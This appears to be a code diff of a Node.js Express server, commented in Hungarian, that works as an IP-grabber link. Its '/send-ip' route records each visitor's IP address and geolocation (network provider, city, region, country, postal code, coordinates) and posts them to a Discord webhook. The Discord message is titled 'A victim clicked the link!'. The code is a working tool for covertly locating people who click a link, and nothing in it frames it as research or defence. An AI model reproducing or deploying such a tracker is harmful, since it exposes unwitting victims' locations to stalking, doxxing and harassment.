@@ -1,5 +1,3 @@
-// server.js
-
 const express = require('express');
 const axios = require('axios');
 require('dotenv').config();
@@ -29,4 +27,30 @@ app.get('/send-ip', async (req, res) => {
             content: `<@1095731086513930260>`,
             embeds: [{
                 title: "Egy áldozat rákattintott a linkre!",
-                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>**
+                description: `**IP-cím >>** ${userIp}
+**Hálózat >>** ${geoData.org || 'N/A'}
+**Város >>** ${geoData.city || 'N/A'}
+**Régió >>** ${geoData.region || 'N/A'}
+**Ország >>** ${geoData.country || 'N/A'}
+**Irányítószám >>** ${geoData.postal || 'N/A'}
+**Szélesség >>** ${latitude}
+**Hosszúság >>** ${longitude}`,
+                color: 0x800080
+            }]
+        };
+
+        await axios.post(webhookUrl, message);
+        res.send('IP és helyadatok sikeresen elküldve Discordra!');
+    } catch (error) {
+        console.error('Hiba:', error.message);
+        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
+    }
+});
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.listen(port, () => {
+    console.log(`Server is running on http://localhost:${port}`);
+});
